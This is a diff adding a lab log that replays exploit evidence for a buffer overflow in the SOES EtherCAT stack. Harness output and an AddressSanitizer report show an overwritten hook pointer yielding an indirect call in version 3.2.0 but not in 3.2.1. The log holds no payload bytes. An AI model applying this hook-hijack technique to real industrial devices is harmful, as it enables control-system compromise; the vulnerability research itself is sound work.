@@ -1,0 +1,83 @@
+SOES2SHELL clean-checkout replay — CVE-2026-129811 real BSS hook-slot indirect call
+2026-11-22 ~17:0xZ wake 12. Goal: prove the pending witness replay has no untracked harness dependency.
+Step 1: git archive HEAD lab/frontier/soes2shell | tar -x -C <tmp>. Only the two pinned tarballs (untracked by design) were copied in from the working tree src/.
+
+soes-v3.2.0.tar.gz: OK
+soes-v3.2.1.tar.gz: OK
+fix-v3.2.0-v3.2.1.diff: OK
+
+Step 2: sh harness/build.sh from the archived tree
+build rc=0, binaries built: 18
+
+Step 3: hook cases (exact observed stdout)
+--- ./build/coe_hook_call_3.2.0 
+deliver: idx=1c12 sub=0 cmd=30 len=20
+deliver: idx=2000 sub=0 cmd=2e len=14
+deliver: idx=2000 sub=1 cmd=22 len=14
+deliver: idx=2001 sub=0 cmd=2e len=14
+deliver: idx=2001 sub=1 cmd=22 len=14
+sizeOfPDO=64 nmappings=2 MAX_RXPDO_SIZE=42
+after cycle1: obj=0x62f5d141f3f0 rxpdo_override=0x62f5d14187b0 txpdo_override=(nil) hits=0
+MARKER_A: real RXPDO_update called the chosen rxpdo_override
+after cycle2: hits=1 chosen=0x62f5d14187b0
+verdict: hook_written=1 indirect_call=1 marker_a=1 marker_b=0
+--- ./build/coe_hook_call_3.2.0 b
+deliver: idx=1c12 sub=0 cmd=30 len=20
+deliver: idx=2000 sub=0 cmd=2e len=14
+deliver: idx=2000 sub=1 cmd=22 len=14
+deliver: idx=2001 sub=0 cmd=2e len=14
+deliver: idx=2001 sub=1 cmd=22 len=14
+sizeOfPDO=64 nmappings=2 MAX_RXPDO_SIZE=42
+after cycle1: obj=0x64df982493f0 rxpdo_override=0x64df98242780 txpdo_override=(nil) hits=0
+MARKER_B: varied byte selected a different called function
+after cycle2: hits=10 chosen=0x64df98242780
+verdict: hook_written=1 indirect_call=1 marker_a=0 marker_b=1
+--- ./build/coe_hook_call_3.2.0 safe
+deliver: idx=1c12 sub=0 cmd=30 len=18
+deliver: idx=2000 sub=0 cmd=2e len=14
+deliver: idx=2000 sub=1 cmd=22 len=14
+deliver: idx=2001 sub=0 cmd=2e len=14
+deliver: idx=2001 sub=1 cmd=22 len=14
+sizeOfPDO=32 nmappings=1 MAX_RXPDO_SIZE=42
+after cycle1: obj=0x586521178d40 rxpdo_override=(nil) txpdo_override=(nil) hits=0
+after cycle2: hits=0 chosen=0x5865211727b0
+verdict: hook_written=0 indirect_call=0 marker_a=0 marker_b=0
+--- ./build/coe_hook_call_3.2.1 
+deliver: idx=1c12 sub=0 cmd=30 len=20
+deliver: idx=2000 sub=0 cmd=2e len=14
+deliver: idx=2000 sub=1 cmd=22 len=14
+deliver: idx=2001 sub=0 cmd=2e len=14
+deliver: idx=2001 sub=1 cmd=22 len=14
+sizeOfPDO=0 nmappings=-1 MAX_RXPDO_SIZE=42
+after cycle1: obj=0x635948ab3d40 rxpdo_override=(nil) txpdo_override=(nil) hits=0
+after cycle2: hits=0 chosen=0x635948aad7b0
+verdict: hook_written=0 indirect_call=0 marker_a=0 marker_b=0
+--- ./build/coe_hook_call_3.2.1 b
+deliver: idx=1c12 sub=0 cmd=30 len=20
+deliver: idx=2000 sub=0 cmd=2e len=14
+deliver: idx=2000 sub=1 cmd=22 len=14
+deliver: idx=2001 sub=0 cmd=2e len=14
+deliver: idx=2001 sub=1 cmd=22 len=14
+sizeOfPDO=0 nmappings=-1 MAX_RXPDO_SIZE=42
+after cycle1: obj=0x5dc4a6b20d40 rxpdo_override=(nil) txpdo_override=(nil) hits=0
+after cycle2: hits=0 chosen=0x5dc4a6b1a780
+verdict: hook_written=0 indirect_call=0 marker_a=0 marker_b=0
+--- ./build/coe_hook_call_3.2.1 safe
+deliver: idx=1c12 sub=0 cmd=30 len=18
+deliver: idx=2000 sub=0 cmd=2e len=14
+deliver: idx=2000 sub=1 cmd=22 len=14
+deliver: idx=2001 sub=0 cmd=2e len=14
+deliver: idx=2001 sub=1 cmd=22 len=14
+sizeOfPDO=32 nmappings=1 MAX_RXPDO_SIZE=42
+after cycle1: obj=0x5cf6c4af0d40 rxpdo_override=(nil) txpdo_override=(nil) hits=0
+after cycle2: hits=0 chosen=0x5cf6c4aea7b0
+verdict: hook_written=0 indirect_call=0 marker_a=0 marker_b=0
+
+Step 4: ASan attack (exact observed report lines)
+==2281199==ERROR: AddressSanitizer: global-buffer-overflow on address 0x5baa6b3967ca at pc 0x5baa6ade6308 bp 0x7fffd30e77f0 sp 0x7fffd30e6fb0
+WRITE of size 64 at 0x5baa6b3967ca thread T0
+    #2 0x5baa6ae1ccb4 in RXPDO_update /tmp/soes-clean-hook-evidence-2216324/lab/frontier/soes2shell/src/SOES-3.2.0/soes/ecat_slv.c:172:7
+0x5baa6b3967ca is located 0 bytes after global variable 'rxpdo' defined in '/tmp/soes-clean-hook-evidence-2216324/lab/frontier/soes2shell/src/SOES-3.2.0/soes/ecat_slv.c:26' (0x5baa6b3967a0) of size 42
+SUMMARY: AddressSanitizer: global-buffer-overflow (/tmp/soes-clean-hook-evidence-2216324/lab/frontier/soes2shell/build/coe_hook_call_asan_3.2.0+0xc3307) (BuildId: 2b85bc3c292ca4d02ec2a578a60be97c82f4ffde) in __asan_memcpy
+
+Verdict: all author e574fed verdicts reproduced from a clean HEAD archive; no untracked harness file needed. Grade unchanged: rung 4 harness-level, rung 5 NOT claimed, wire reach UNKNOWN.
